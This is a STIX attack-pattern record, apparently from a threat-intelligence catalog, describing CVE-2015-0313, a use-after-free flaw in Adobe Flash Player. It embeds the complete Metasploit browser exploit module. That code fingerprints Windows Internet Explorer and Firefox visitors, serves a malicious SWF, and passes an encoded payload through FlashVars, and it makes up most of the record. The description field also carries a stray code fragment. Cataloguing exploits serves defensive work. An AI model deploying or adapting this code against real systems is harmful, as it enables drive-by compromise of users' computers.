{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c81e44d7-7853-4772-a6fc-097632037f61",
    "created": "2024-08-14T16:43:36.889354Z",
    "modified": "2024-08-14T16:43:36.889358Z",
    "name": "Adobe Flash Player ByteArray With Workers Use After Free",
    "description": " This module exploits a use-after-free vulnerability in Adobe Flash Player. The vulnerability occurs when the ByteArray assigned to the current ApplicationDomain is freed from an ActionScript worker, which can fill the memory and notify the main thread to corrupt the new contents. This module has been tested successfully on Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 16.0.0.296.  'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_worker_byte_array_uaf.rb",
            "external_id": "adobe_flash_worker_byte_array_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0313"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsa15-02.html"
        },
        {
            "source_name": "reference",
            "url": "http://hacklab.kr/flash-cve-2015-0313-%EB%B6%84%EC%84%9D/"
        },
        {
            "source_name": "reference",
            "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2015-0313-the-new-flash-player-zero-day/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'                => 'Adobe Flash Player ByteArray With Workers Use After Free',\n      'Description'         => %q{\n        This module exploits a use-after-free vulnerability in Adobe Flash Player. The\n        vulnerability occurs when the ByteArray assigned to the current ApplicationDomain\n        is freed from an ActionScript worker, which can fill the memory and notify the main\n        thread to corrupt the new contents. This module has been tested successfully on\n        Windows 7 SP1 (32-bit), IE 8 to IE 11 and Flash 16.0.0.296.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'Unknown', # Vulnerability discovery and exploit in the wild\n          'hdarwin', # Public exploit by @hdarwin89 (all the magic)\n          'juan vazquez' # msf module\n        ],\n      'References'          =>\n        [\n          ['CVE', '2015-0313'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsa15-02.html'],\n          ['URL', 'http://hacklab.kr/flash-cve-2015-0313-%EB%B6%84%EC%84%9D/'],\n          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2015-0313-the-new-flash-player-zero-day/']\n        ],\n      'Payload'             =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'            => 'win',\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :os_name => lambda do |os|\n            os =~ OperatingSystems::Match::WINDOWS_7 ||\n              os =~ OperatingSystems::Match::WINDOWS_81\n          end,\n          :ua_name => lambda { |ua| [Msf::HttpClients::IE, Msf::HttpClients::FF].include?(ua) },\n          :flash   => lambda { |ver| ver =~ /^16\\./ && Rex::Version.new(ver) <= Rex::Version.new('16.0.0.296') },\n          :arch    => ARCH_X86\n        },\n      'Targets'             =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'          => false,\n      'DisclosureDate'      => '2015-02-02',\n      'DefaultTarget'       => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status('Sending SWF...')\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status('Sending HTML...')\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    target_payload = get_payload(cli, target_info)\n    b64_payload = Rex::Text.encode_base64(target_payload)\n    platform_id = 'win'\n    os_name = target_info[:os_name]\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0313', 'msf.swf')\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-02-02",
    "x_mitre_platforms": [
        "win'"
    ]
}